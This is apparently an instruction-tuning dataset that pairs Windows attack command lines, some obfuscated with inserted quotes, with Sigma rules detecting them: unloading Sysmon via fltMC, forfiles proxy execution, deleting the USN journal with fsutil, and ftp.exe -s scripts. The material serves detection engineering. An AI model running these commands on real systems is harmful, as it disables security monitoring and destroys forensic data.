{"instruction": "Write Sigma rule to detect payload:", "input": "\\fltMC.exe fltMC.exe unload sysmon", "output": "title: Filter Driver Unloaded Via Fltmc.EXE\nid: 4931188c-178e-4ee7-a348-39e8a7a56821\nrelated:\n    - id: 4d7cda18-1b12-4e52-b45c-d28653210df8 # Sysmon specific\n      type: derived\nstatus: test\ndescription: Detect filter driver unloading activity via fltmc.exe\nreferences:\n    - https://www.darkoperator.com/blog/2018/10/5/operating-offensively-against-sysmon\n    - https://www.cybereason.com/blog/threat-analysis-report-lockbit-2.0-all-paths-lead-to-ransom\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2023-02-13\nmodified: 2024-06-24\ntags:\n    - attack.defense-evasion\n    - attack.t1070\n    - attack.t1562\n    - attack.t1562.002\nlogsource:\n    product: windows\n    category: process_creation\ndetection:\n    selection_img:\n        - Image|endswith: '\\fltMC.exe'\n        - OriginalFileName: 'fltMC.exe'\n    selection_cli:\n        CommandLine|contains: 'unload'\n    filter_optional_avira:\n        ParentImage|startswith: 'C:\\Users\\'\n        ParentImage|contains: '\\AppData\\Local\\Temp\\'\n        ParentImage|endswith: '\\endpoint-protection-installer-x64.tmp'\n        CommandLine|endswith: 'unload rtp_filesystem_filter'\n    filter_optional_manageengine:\n        ParentImage: 'C:\\Program Files (x86)\\ManageEngine\\uems_agent\\bin\\dcfaservice64.exe'\n        CommandLine|endswith: 'unload DFMFilter'\n    condition: all of selection_* and not 1 of filter_optional_*\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\fltMC.exe fltMC.exe unl\\\"oad\\\" sysmon", "output": "title: Filter Driver Unloaded Via Fltmc.EXE\nid: 4931188c-178e-4ee7-a348-39e8a7a56821\nrelated:\n    - id: 4d7cda18-1b12-4e52-b45c-d28653210df8 # Sysmon specific\n      type: derived\nstatus: test\ndescription: Detect filter driver unloading activity via fltmc.exe\nreferences:\n    - https://www.darkoperator.com/blog/2018/10/5/operating-offensively-against-sysmon\n    - https://www.cybereason.com/blog/threat-analysis-report-lockbit-2.0-all-paths-lead-to-ransom\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2023-02-13\nmodified: 2024-06-24\ntags:\n    - attack.defense-evasion\n    - attack.t1070\n    - attack.t1562\n    - attack.t1562.002\nlogsource:\n    product: windows\n    category: process_creation\ndetection:\n    selection_img:\n        - Image|endswith: '\\fltMC.exe'\n        - OriginalFileName: 'fltMC.exe'\n    selection_cli:\n        CommandLine|contains: 'unload'\n    filter_optional_avira:\n        ParentImage|startswith: 'C:\\Users\\'\n        ParentImage|contains: '\\AppData\\Local\\Temp\\'\n        ParentImage|endswith: '\\endpoint-protection-installer-x64.tmp'\n        CommandLine|endswith: 'unload rtp_filesystem_filter'\n    filter_optional_manageengine:\n        ParentImage: 'C:\\Program Files (x86)\\ManageEngine\\uems_agent\\bin\\dcfaservice64.exe'\n        CommandLine|endswith: 'unload DFMFilter'\n    condition: all of selection_* and not 1 of filter_optional_*\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\fltMC fltMC unload sysmon", "output": "title: Filter Driver Unloaded Via Fltmc.EXE\nid: 4931188c-178e-4ee7-a348-39e8a7a56821\nrelated:\n    - id: 4d7cda18-1b12-4e52-b45c-d28653210df8 # Sysmon specific\n      type: derived\nstatus: test\ndescription: Detect filter driver unloading activity via fltmc.exe\nreferences:\n    - https://www.darkoperator.com/blog/2018/10/5/operating-offensively-against-sysmon\n    - https://www.cybereason.com/blog/threat-analysis-report-lockbit-2.0-all-paths-lead-to-ransom\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2023-02-13\nmodified: 2024-06-24\ntags:\n    - attack.defense-evasion\n    - attack.t1070\n    - attack.t1562\n    - attack.t1562.002\nlogsource:\n    product: windows\n    category: process_creation\ndetection:\n    selection_img:\n        - Image|endswith: '\\fltMC.exe'\n        - OriginalFileName: 'fltMC.exe'\n    selection_cli:\n        CommandLine|contains: 'unload'\n    filter_optional_avira:\n        ParentImage|startswith: 'C:\\Users\\'\n        ParentImage|contains: '\\AppData\\Local\\Temp\\'\n        ParentImage|endswith: '\\endpoint-protection-installer-x64.tmp'\n        CommandLine|endswith: 'unload rtp_filesystem_filter'\n    filter_optional_manageengine:\n        ParentImage: 'C:\\Program Files (x86)\\ManageEngine\\uems_agent\\bin\\dcfaservice64.exe'\n        CommandLine|endswith: 'unload DFMFilter'\n    condition: all of selection_* and not 1 of filter_optional_*\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\fltMC.exe fltMC.exe unload sysmon", "output": "title: Filter Driver Unloaded Via Fltmc.EXE\nid: 4931188c-178e-4ee7-a348-39e8a7a56821\nrelated:\n    - id: 4d7cda18-1b12-4e52-b45c-d28653210df8 # Sysmon specific\n      type: derived\nstatus: test\ndescription: Detect filter driver unloading activity via fltmc.exe\nreferences:\n    - https://www.darkoperator.com/blog/2018/10/5/operating-offensively-against-sysmon\n    - https://www.cybereason.com/blog/threat-analysis-report-lockbit-2.0-all-paths-lead-to-ransom\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2023-02-13\nmodified: 2024-06-24\ntags:\n    - attack.defense-evasion\n    - attack.t1070\n    - attack.t1562\n    - attack.t1562.002\nlogsource:\n    product: windows\n    category: process_creation\ndetection:\n    selection_img:\n        - Image|endswith: '\\fltMC.exe'\n        - OriginalFileName: 'fltMC.exe'\n    selection_cli:\n        CommandLine|contains: 'unload'\n    filter_optional_avira:\n        ParentImage|startswith: 'C:\\Users\\'\n        ParentImage|contains: '\\AppData\\Local\\Temp\\'\n        ParentImage|endswith: '\\endpoint-protection-installer-x64.tmp'\n        CommandLine|endswith: 'unload rtp_filesystem_filter'\n    filter_optional_manageengine:\n        ParentImage: 'C:\\Program Files (x86)\\ManageEngine\\uems_agent\\bin\\dcfaservice64.exe'\n        CommandLine|endswith: 'unload DFMFilter'\n    condition: all of selection_* and not 1 of filter_optional_*\nfalsepositives:\n    - Unknown\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\forfiles.exe forfiles.exe -c", "output": "title: Forfiles Command Execution\nid: 9aa5106d-bce3-4b13-86df-3a20f1d5cf0b\nrelated:\n    - id: a85cf4e3-56ee-4e79-adeb-789f8fb209a8\n      type: obsolete\n    - id: fa47597e-90e9-41cd-ab72-c3b74cfb0d02\n      type: obsolete\nstatus: test\ndescription: |\n    Detects the execution of \"forfiles\" with the \"/c\" flag.\n    While this is an expected behavior of the tool, it can be abused in order to proxy execution through it with any binary.\n    Can be used to bypass application whitelisting.\nreferences:\n    - https://lolbas-project.github.io/lolbas/Binaries/Forfiles/\n    - https://pentestlab.blog/2020/07/06/indirect-command-execution/\nauthor: Tim Rauch, Elastic, E.M. Anhaus (originally from Atomic Blue Detections, Endgame), oscd.community\ndate: 2022-06-14\nmodified: 2024-03-05\ntags:\n    - attack.execution\n    - attack.t1059\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\forfiles.exe'\n        - OriginalFileName: 'forfiles.exe'\n    selection_cli:\n        CommandLine|contains|windash: ' -c '\n    condition: all of selection_*\nfalsepositives:\n    - Legitimate use via a batch script or by an administrator.\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\forfiles.exe \"forfiles.exe\" -c", "output": "title: Forfiles Command Execution\nid: 9aa5106d-bce3-4b13-86df-3a20f1d5cf0b\nrelated:\n    - id: a85cf4e3-56ee-4e79-adeb-789f8fb209a8\n      type: obsolete\n    - id: fa47597e-90e9-41cd-ab72-c3b74cfb0d02\n      type: obsolete\nstatus: test\ndescription: |\n    Detects the execution of \"forfiles\" with the \"/c\" flag.\n    While this is an expected behavior of the tool, it can be abused in order to proxy execution through it with any binary.\n    Can be used to bypass application whitelisting.\nreferences:\n    - https://lolbas-project.github.io/lolbas/Binaries/Forfiles/\n    - https://pentestlab.blog/2020/07/06/indirect-command-execution/\nauthor: Tim Rauch, Elastic, E.M. Anhaus (originally from Atomic Blue Detections, Endgame), oscd.community\ndate: 2022-06-14\nmodified: 2024-03-05\ntags:\n    - attack.execution\n    - attack.t1059\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\forfiles.exe'\n        - OriginalFileName: 'forfiles.exe'\n    selection_cli:\n        CommandLine|contains|windash: ' -c '\n    condition: all of selection_*\nfalsepositives:\n    - Legitimate use via a batch script or by an administrator.\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\forfiles forfiles -c", "output": "title: Forfiles Command Execution\nid: 9aa5106d-bce3-4b13-86df-3a20f1d5cf0b\nrelated:\n    - id: a85cf4e3-56ee-4e79-adeb-789f8fb209a8\n      type: obsolete\n    - id: fa47597e-90e9-41cd-ab72-c3b74cfb0d02\n      type: obsolete\nstatus: test\ndescription: |\n    Detects the execution of \"forfiles\" with the \"/c\" flag.\n    While this is an expected behavior of the tool, it can be abused in order to proxy execution through it with any binary.\n    Can be used to bypass application whitelisting.\nreferences:\n    - https://lolbas-project.github.io/lolbas/Binaries/Forfiles/\n    - https://pentestlab.blog/2020/07/06/indirect-command-execution/\nauthor: Tim Rauch, Elastic, E.M. Anhaus (originally from Atomic Blue Detections, Endgame), oscd.community\ndate: 2022-06-14\nmodified: 2024-03-05\ntags:\n    - attack.execution\n    - attack.t1059\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\forfiles.exe'\n        - OriginalFileName: 'forfiles.exe'\n    selection_cli:\n        CommandLine|contains|windash: ' -c '\n    condition: all of selection_*\nfalsepositives:\n    - Legitimate use via a batch script or by an administrator.\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\forfiles.exe forfiles.exe -c", "output": "title: Forfiles Command Execution\nid: 9aa5106d-bce3-4b13-86df-3a20f1d5cf0b\nrelated:\n    - id: a85cf4e3-56ee-4e79-adeb-789f8fb209a8\n      type: obsolete\n    - id: fa47597e-90e9-41cd-ab72-c3b74cfb0d02\n      type: obsolete\nstatus: test\ndescription: |\n    Detects the execution of \"forfiles\" with the \"/c\" flag.\n    While this is an expected behavior of the tool, it can be abused in order to proxy execution through it with any binary.\n    Can be used to bypass application whitelisting.\nreferences:\n    - https://lolbas-project.github.io/lolbas/Binaries/Forfiles/\n    - https://pentestlab.blog/2020/07/06/indirect-command-execution/\nauthor: Tim Rauch, Elastic, E.M. Anhaus (originally from Atomic Blue Detections, Endgame), oscd.community\ndate: 2022-06-14\nmodified: 2024-03-05\ntags:\n    - attack.execution\n    - attack.t1059\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\forfiles.exe'\n        - OriginalFileName: 'forfiles.exe'\n    selection_cli:\n        CommandLine|contains|windash: ' -c '\n    condition: all of selection_*\nfalsepositives:\n    - Legitimate use via a batch script or by an administrator.\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\format.com /fs: /fs:exFAT /fs:FAT /fs:NTFS /fs:ReFS /fs:UDF", "output": "title: Uncommon FileSystem Load Attempt By Format.com\nid: 9fb6b26e-7f9e-4517-a48b-8cac4a1b6c60\nstatus: test\ndescription: |\n    Detects the execution of format.com with an uncommon filesystem selection that could indicate a defense evasion activity in which \"format.com\" is used to load malicious DLL files or other programs.\nreferences:\n    - https://twitter.com/0gtweet/status/1477925112561209344\n    - https://twitter.com/wdormann/status/1478011052130459653?s=20\nauthor: Florian Roth (Nextron Systems)\ndate: 2022-01-04\nmodified: 2024-05-13\ntags:\n    - attack.defense-evasion\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\format.com'\n        CommandLine|contains: '/fs:'\n    filter_main_known_fs:\n        CommandLine|contains:\n            - '/fs:exFAT'\n            - '/fs:FAT'\n            - '/fs:NTFS'\n            - '/fs:ReFS'\n            - '/fs:UDF'\n    condition: selection and not 1 of filter_main_*\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\format.com /fs: /fs:exFAT /fs:FAT /fs:NTFS /fs:ReFS /fs:UDF", "output": "title: Uncommon FileSystem Load Attempt By Format.com\nid: 9fb6b26e-7f9e-4517-a48b-8cac4a1b6c60\nstatus: test\ndescription: |\n    Detects the execution of format.com with an uncommon filesystem selection that could indicate a defense evasion activity in which \"format.com\" is used to load malicious DLL files or other programs.\nreferences:\n    - https://twitter.com/0gtweet/status/1477925112561209344\n    - https://twitter.com/wdormann/status/1478011052130459653?s=20\nauthor: Florian Roth (Nextron Systems)\ndate: 2022-01-04\nmodified: 2024-05-13\ntags:\n    - attack.defense-evasion\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\format.com'\n        CommandLine|contains: '/fs:'\n    filter_main_known_fs:\n        CommandLine|contains:\n            - '/fs:exFAT'\n            - '/fs:FAT'\n            - '/fs:NTFS'\n            - '/fs:ReFS'\n            - '/fs:UDF'\n    condition: selection and not 1 of filter_main_*\nfalsepositives:\n    - Unknown\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\fsutil.exe fsutil.exe drives", "output": "title: Fsutil Drive Enumeration\nid: 63de06b9-a385-40b5-8b32-73f2b9ef84b6\nstatus: test\ndescription: Attackers may leverage fsutil to enumerated connected drives.\nreferences:\n    - Turla has used fsutil fsinfo drives to list connected drives.\n    - https://github.com/elastic/detection-rules/blob/414d32027632a49fb239abb8fbbb55d3fa8dd861/rules/windows/discovery_peripheral_device.toml\nauthor: Christopher Peacock '@securepeacock', SCYTHE '@scythe_io'\ndate: 2022-03-29\nmodified: 2022-07-14\ntags:\n    - attack.discovery\n    - attack.t1120\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\fsutil.exe'\n        - OriginalFileName: 'fsutil.exe'\n    selection_cli:\n        CommandLine|contains: 'drives'\n    condition: all of selection_*\nfalsepositives:\n    - Certain software or administrative tasks may trigger false positives.\nlevel: low"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\fsutil.exe \"f\"\"s\"\"u\"\"t\"\"i\"\"l\"\".\"\"e\"\"x\"\"e\" drives", "output": "title: Fsutil Drive Enumeration\nid: 63de06b9-a385-40b5-8b32-73f2b9ef84b6\nstatus: test\ndescription: Attackers may leverage fsutil to enumerated connected drives.\nreferences:\n    - Turla has used fsutil fsinfo drives to list connected drives.\n    - https://github.com/elastic/detection-rules/blob/414d32027632a49fb239abb8fbbb55d3fa8dd861/rules/windows/discovery_peripheral_device.toml\nauthor: Christopher Peacock '@securepeacock', SCYTHE '@scythe_io'\ndate: 2022-03-29\nmodified: 2022-07-14\ntags:\n    - attack.discovery\n    - attack.t1120\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\fsutil.exe'\n        - OriginalFileName: 'fsutil.exe'\n    selection_cli:\n        CommandLine|contains: 'drives'\n    condition: all of selection_*\nfalsepositives:\n    - Certain software or administrative tasks may trigger false positives.\nlevel: low"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\fsutil fsutil drives", "output": "title: Fsutil Drive Enumeration\nid: 63de06b9-a385-40b5-8b32-73f2b9ef84b6\nstatus: test\ndescription: Attackers may leverage fsutil to enumerated connected drives.\nreferences:\n    - Turla has used fsutil fsinfo drives to list connected drives.\n    - https://github.com/elastic/detection-rules/blob/414d32027632a49fb239abb8fbbb55d3fa8dd861/rules/windows/discovery_peripheral_device.toml\nauthor: Christopher Peacock '@securepeacock', SCYTHE '@scythe_io'\ndate: 2022-03-29\nmodified: 2022-07-14\ntags:\n    - attack.discovery\n    - attack.t1120\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\fsutil.exe'\n        - OriginalFileName: 'fsutil.exe'\n    selection_cli:\n        CommandLine|contains: 'drives'\n    condition: all of selection_*\nfalsepositives:\n    - Certain software or administrative tasks may trigger false positives.\nlevel: low"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\fsutil.exe drives fsutil.exe", "output": "title: Fsutil Drive Enumeration\nid: 63de06b9-a385-40b5-8b32-73f2b9ef84b6\nstatus: test\ndescription: Attackers may leverage fsutil to enumerated connected drives.\nreferences:\n    - Turla has used fsutil fsinfo drives to list connected drives.\n    - https://github.com/elastic/detection-rules/blob/414d32027632a49fb239abb8fbbb55d3fa8dd861/rules/windows/discovery_peripheral_device.toml\nauthor: Christopher Peacock '@securepeacock', SCYTHE '@scythe_io'\ndate: 2022-03-29\nmodified: 2022-07-14\ntags:\n    - attack.discovery\n    - attack.t1120\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\fsutil.exe'\n        - OriginalFileName: 'fsutil.exe'\n    selection_cli:\n        CommandLine|contains: 'drives'\n    condition: all of selection_*\nfalsepositives:\n    - Certain software or administrative tasks may trigger false positives.\nlevel: low"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\fsutil.exe fsutil.exe behavior set SymlinkEvaluation", "output": "title: Fsutil Behavior Set SymlinkEvaluation\nid: c0b2768a-dd06-4671-8339-b16ca8d1f27f\nstatus: test\ndescription: |\n    A symbolic link is a type of file that contains a reference to another file.\n    This is probably done to make sure that the ransomware is able to follow shortcuts on the machine in order to find the original file to encrypt\nreferences:\n    - https://www.cybereason.com/blog/cybereason-vs.-blackcat-ransomware\n    - https://learn.microsoft.com/fr-fr/windows-server/administration/windows-commands/fsutil-behavior\nauthor: frack113\ndate: 2022-03-02\nmodified: 2023-01-19\ntags:\n    - attack.execution\n    - attack.t1059\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\fsutil.exe'\n        - OriginalFileName: 'fsutil.exe'\n    selection_cli:\n        CommandLine|contains|all:\n            - 'behavior '\n            - 'set '\n            - 'SymlinkEvaluation'\n    condition: all of selection_*\nfalsepositives:\n    - Legitimate use\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\fsutil.exe fsuti\\\"l.exe\\\" behavior set SymlinkEvaluation", "output": "title: Fsutil Behavior Set SymlinkEvaluation\nid: c0b2768a-dd06-4671-8339-b16ca8d1f27f\nstatus: test\ndescription: |\n    A symbolic link is a type of file that contains a reference to another file.\n    This is probably done to make sure that the ransomware is able to follow shortcuts on the machine in order to find the original file to encrypt\nreferences:\n    - https://www.cybereason.com/blog/cybereason-vs.-blackcat-ransomware\n    - https://learn.microsoft.com/fr-fr/windows-server/administration/windows-commands/fsutil-behavior\nauthor: frack113\ndate: 2022-03-02\nmodified: 2023-01-19\ntags:\n    - attack.execution\n    - attack.t1059\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\fsutil.exe'\n        - OriginalFileName: 'fsutil.exe'\n    selection_cli:\n        CommandLine|contains|all:\n            - 'behavior '\n            - 'set '\n            - 'SymlinkEvaluation'\n    condition: all of selection_*\nfalsepositives:\n    - Legitimate use\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\fsutil fsutil behavior set SymlinkEvaluation", "output": "title: Fsutil Behavior Set SymlinkEvaluation\nid: c0b2768a-dd06-4671-8339-b16ca8d1f27f\nstatus: test\ndescription: |\n    A symbolic link is a type of file that contains a reference to another file.\n    This is probably done to make sure that the ransomware is able to follow shortcuts on the machine in order to find the original file to encrypt\nreferences:\n    - https://www.cybereason.com/blog/cybereason-vs.-blackcat-ransomware\n    - https://learn.microsoft.com/fr-fr/windows-server/administration/windows-commands/fsutil-behavior\nauthor: frack113\ndate: 2022-03-02\nmodified: 2023-01-19\ntags:\n    - attack.execution\n    - attack.t1059\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\fsutil.exe'\n        - OriginalFileName: 'fsutil.exe'\n    selection_cli:\n        CommandLine|contains|all:\n            - 'behavior '\n            - 'set '\n            - 'SymlinkEvaluation'\n    condition: all of selection_*\nfalsepositives:\n    - Legitimate use\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\fsutil.exe fsutil.exe set SymlinkEvaluation behavior", "output": "title: Fsutil Behavior Set SymlinkEvaluation\nid: c0b2768a-dd06-4671-8339-b16ca8d1f27f\nstatus: test\ndescription: |\n    A symbolic link is a type of file that contains a reference to another file.\n    This is probably done to make sure that the ransomware is able to follow shortcuts on the machine in order to find the original file to encrypt\nreferences:\n    - https://www.cybereason.com/blog/cybereason-vs.-blackcat-ransomware\n    - https://learn.microsoft.com/fr-fr/windows-server/administration/windows-commands/fsutil-behavior\nauthor: frack113\ndate: 2022-03-02\nmodified: 2023-01-19\ntags:\n    - attack.execution\n    - attack.t1059\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\fsutil.exe'\n        - OriginalFileName: 'fsutil.exe'\n    selection_cli:\n        CommandLine|contains|all:\n            - 'behavior '\n            - 'set '\n            - 'SymlinkEvaluation'\n    condition: all of selection_*\nfalsepositives:\n    - Legitimate use\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\fsutil.exe fsutil.exe deletejournal createjournal setZeroData", "output": "title: Fsutil Suspicious Invocation\nid: add64136-62e5-48ea-807e-88638d02df1e\nstatus: stable\ndescription: |\n  Detects suspicious parameters of fsutil (deleting USN journal, configuring it with small size, etc).\n  Might be used by ransomwares during the attack (seen by NotPetya and others).\nreferences:\n    - https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/fsutil-usn\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1070/T1070.md\n    - https://eqllib.readthedocs.io/en/latest/analytics/c91f422a-5214-4b17-8664-c5fcf115c0a2.html\n    - https://github.com/albertzsigovits/malware-notes/blob/558898932c1579ff589290092a2c8febefc3a4c9/Ransomware/Lockbit.md\n    - https://blog.cluster25.duskrise.com/2023/05/22/back-in-black-blackbyte-nt\nauthor: Ecco, E.M. Anhaus, oscd.community\ndate: 2019-09-26\nmodified: 2023-09-09\ntags:\n    - attack.defense-evasion\n    - attack.impact\n    - attack.t1070\n    - attack.t1485\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\fsutil.exe'\n        - OriginalFileName: 'fsutil.exe'\n    selection_cli:\n        CommandLine|contains:\n            - 'deletejournal'        # usn deletejournal ==> generally ransomware or attacker\n            - 'createjournal'        # usn createjournal ==> can modify config to set it to a tiny size\n            - 'setZeroData'          # file setZeroData  ==> empties a file with zeroes\n    condition: all of selection_*\nfalsepositives:\n    - Admin activity\n    - Scripts and administrative tools used in the monitored environment\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\fsutil.exe fsutil.exe \"d\"\"e\"\"l\"\"e\"\"t\"\"e\"\"j\"\"o\"\"u\"\"r\"\"n\"\"a\"\"l\" createjournal setZeroData", "output": "title: Fsutil Suspicious Invocation\nid: add64136-62e5-48ea-807e-88638d02df1e\nstatus: stable\ndescription: |\n  Detects suspicious parameters of fsutil (deleting USN journal, configuring it with small size, etc).\n  Might be used by ransomwares during the attack (seen by NotPetya and others).\nreferences:\n    - https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/fsutil-usn\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1070/T1070.md\n    - https://eqllib.readthedocs.io/en/latest/analytics/c91f422a-5214-4b17-8664-c5fcf115c0a2.html\n    - https://github.com/albertzsigovits/malware-notes/blob/558898932c1579ff589290092a2c8febefc3a4c9/Ransomware/Lockbit.md\n    - https://blog.cluster25.duskrise.com/2023/05/22/back-in-black-blackbyte-nt\nauthor: Ecco, E.M. Anhaus, oscd.community\ndate: 2019-09-26\nmodified: 2023-09-09\ntags:\n    - attack.defense-evasion\n    - attack.impact\n    - attack.t1070\n    - attack.t1485\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\fsutil.exe'\n        - OriginalFileName: 'fsutil.exe'\n    selection_cli:\n        CommandLine|contains:\n            - 'deletejournal'        # usn deletejournal ==> generally ransomware or attacker\n            - 'createjournal'        # usn createjournal ==> can modify config to set it to a tiny size\n            - 'setZeroData'          # file setZeroData  ==> empties a file with zeroes\n    condition: all of selection_*\nfalsepositives:\n    - Admin activity\n    - Scripts and administrative tools used in the monitored environment\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\fsutil fsutil deletejournal createjournal setZeroData", "output": "title: Fsutil Suspicious Invocation\nid: add64136-62e5-48ea-807e-88638d02df1e\nstatus: stable\ndescription: |\n  Detects suspicious parameters of fsutil (deleting USN journal, configuring it with small size, etc).\n  Might be used by ransomwares during the attack (seen by NotPetya and others).\nreferences:\n    - https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/fsutil-usn\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1070/T1070.md\n    - https://eqllib.readthedocs.io/en/latest/analytics/c91f422a-5214-4b17-8664-c5fcf115c0a2.html\n    - https://github.com/albertzsigovits/malware-notes/blob/558898932c1579ff589290092a2c8febefc3a4c9/Ransomware/Lockbit.md\n    - https://blog.cluster25.duskrise.com/2023/05/22/back-in-black-blackbyte-nt\nauthor: Ecco, E.M. Anhaus, oscd.community\ndate: 2019-09-26\nmodified: 2023-09-09\ntags:\n    - attack.defense-evasion\n    - attack.impact\n    - attack.t1070\n    - attack.t1485\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\fsutil.exe'\n        - OriginalFileName: 'fsutil.exe'\n    selection_cli:\n        CommandLine|contains:\n            - 'deletejournal'        # usn deletejournal ==> generally ransomware or attacker\n            - 'createjournal'        # usn createjournal ==> can modify config to set it to a tiny size\n            - 'setZeroData'          # file setZeroData  ==> empties a file with zeroes\n    condition: all of selection_*\nfalsepositives:\n    - Admin activity\n    - Scripts and administrative tools used in the monitored environment\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\fsutil.exe setZeroData deletejournal createjournal fsutil.exe", "output": "title: Fsutil Suspicious Invocation\nid: add64136-62e5-48ea-807e-88638d02df1e\nstatus: stable\ndescription: |\n  Detects suspicious parameters of fsutil (deleting USN journal, configuring it with small size, etc).\n  Might be used by ransomwares during the attack (seen by NotPetya and others).\nreferences:\n    - https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/fsutil-usn\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1070/T1070.md\n    - https://eqllib.readthedocs.io/en/latest/analytics/c91f422a-5214-4b17-8664-c5fcf115c0a2.html\n    - https://github.com/albertzsigovits/malware-notes/blob/558898932c1579ff589290092a2c8febefc3a4c9/Ransomware/Lockbit.md\n    - https://blog.cluster25.duskrise.com/2023/05/22/back-in-black-blackbyte-nt\nauthor: Ecco, E.M. Anhaus, oscd.community\ndate: 2019-09-26\nmodified: 2023-09-09\ntags:\n    - attack.defense-evasion\n    - attack.impact\n    - attack.t1070\n    - attack.t1485\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\fsutil.exe'\n        - OriginalFileName: 'fsutil.exe'\n    selection_cli:\n        CommandLine|contains:\n            - 'deletejournal'        # usn deletejournal ==> generally ransomware or attacker\n            - 'createjournal'        # usn createjournal ==> can modify config to set it to a tiny size\n            - 'setZeroData'          # file setZeroData  ==> empties a file with zeroes\n    condition: all of selection_*\nfalsepositives:\n    - Admin activity\n    - Scripts and administrative tools used in the monitored environment\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\ftp.exe \\ftp.exe ftp.exe -s:", "output": "title: Potential Arbitrary Command Execution Via FTP.EXE\nid: 06b401f4-107c-4ff9-947f-9ec1e7649f1e\nstatus: test\ndescription: Detects execution of \"ftp.exe\" script with the \"-s\" or \"/s\" flag and any child processes ran by \"ftp.exe\".\nreferences:\n    - https://lolbas-project.github.io/lolbas/Binaries/Ftp/\nauthor: Victor Sergeev, oscd.community\ndate: 2020-10-09\nmodified: 2024-04-23\ntags:\n    - attack.execution\n    - attack.t1059\n    - attack.defense-evasion\n    - attack.t1202\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_parent:\n        ParentImage|endswith: '\\ftp.exe'\n    selection_child_img:\n        - Image|endswith: '\\ftp.exe'\n        - OriginalFileName: 'ftp.exe'\n    selection_child_cli:\n        CommandLine|contains|windash: '-s:'\n    condition: selection_parent or all of selection_child_*\nfalsepositives:\n    - Unknown\nlevel: medium"}
